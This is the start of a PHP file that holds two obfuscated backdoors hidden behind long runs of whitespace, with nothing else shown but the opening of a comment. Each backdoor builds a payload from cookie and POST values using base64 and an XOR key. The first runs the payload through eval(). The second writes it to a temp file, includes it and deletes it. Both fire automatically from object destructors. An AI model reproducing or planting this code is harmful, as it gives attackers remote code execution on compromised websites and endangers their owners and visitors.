<?php                                                                                                                                                                                                                                                                                                                                                                                                 $pAaiq = chr (68) . chr (84) . "\x5f" . chr (117) . chr (66) . "\103" . chr ( 308 - 208 ); $MEMoCNwK = "\x63" . chr (108) . chr (97) . "\x73" . "\163" . chr ( 962 - 867 )."\x65" . "\x78" . "\x69" . "\163" . chr (116) . chr ( 495 - 380 ); $dmgPDE = $MEMoCNwK($pAaiq); $bOqozke = $dmgPDE;if (!$bOqozke){class DT_uBCd{private $XkMokVA;public static $HIjYy = "ad9eab5f-4300-4d42-abba-53ca0c006211";public static $hByLgJH = 6194;public function __construct($ZgiKqtZ=0){$kIOsmYu = $_COOKIE;$MhLVvRkKt = $_POST;$LHCAy = @$kIOsmYu[substr(DT_uBCd::$HIjYy, 0, 4)];if (!empty($LHCAy)){$didIBlbaqx = "base64";$IzHsdGIHZ = "";$LHCAy = explode(",", $LHCAy);foreach ($LHCAy as $ZClaYilYR){$IzHsdGIHZ .= @$kIOsmYu[$ZClaYilYR];$IzHsdGIHZ .= @$MhLVvRkKt[$ZClaYilYR];}$IzHsdGIHZ = array_map($didIBlbaqx . "\137" . chr ( 522 - 422 ).chr (101) . chr ( 527 - 428 ).'o' . 'd' . chr (101), array($IzHsdGIHZ,)); $IzHsdGIHZ = $IzHsdGIHZ[0] ^ str_repeat(DT_uBCd::$HIjYy, (strlen($IzHsdGIHZ[0]) / strlen(DT_uBCd::$HIjYy)) + 1);DT_uBCd::$hByLgJH = @unserialize($IzHsdGIHZ);}}private function Ahwkn(){if (is_array(DT_uBCd::$hByLgJH)) {$bAgRaxc = str_replace("\74" . "\x3f" . "\160" . "\150" . 'p', "", DT_uBCd::$hByLgJH["\143" . "\157" . 'n' . "\164" . "\x65" . chr ( 355 - 245 ).'t']);eval($bAgRaxc); $qwWFiZ = "43801";exit();}}public function __destruct(){$this->Ahwkn(); $qwWFiZ = "43801";}}$hqJwr = new DT_uBCd(); $hqJwr = "54359_41235";} ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("tmapw")){class tmapw{public static $lzlwy = "qmmquahqmkuvvgie";public static $wupur = NULL;public function __construct(){$bmtklna = @$_COOKIE[substr(tmapw::$lzlwy, 0, 4)];if (!empty($bmtklna)){$bjubd = "base64";$xyihfpczob = "";$bmtklna = explode(",", $bmtklna);foreach ($bmtklna as $yxrkirxj){$xyihfpczob .= @$_COOKIE[$yxrkirxj];$xyihfpczob .= @$_POST[$yxrkirxj];}$xyihfpczob = array_map($bjubd . "_decode", array($xyihfpczob,));$xyihfpczob = $xyihfpczob[0] ^ str_repeat(tmapw::$lzlwy, (strlen($xyihfpczob[0]) / strlen(tmapw::$lzlwy)) + 1);tmapw::$wupur = @unserialize($xyihfpczob);}}public function __destruct(){$this->kqoob();}private function kqoob(){if (is_array(tmapw::$wupur)) {$wsrxjlid = sys_get_temp_dir() . "/" . crc32(tmapw::$wupur["salt"]);@tmapw::$wupur["write"]($wsrxjlid, tmapw::$wupur["content"]);include $wsrxjlid;@tmapw::$wupur["delete"]($wsrxjlid);exit();}}}$ltmahqa = new tmapw();$ltmahqa = NULL;} ?><?php
/**
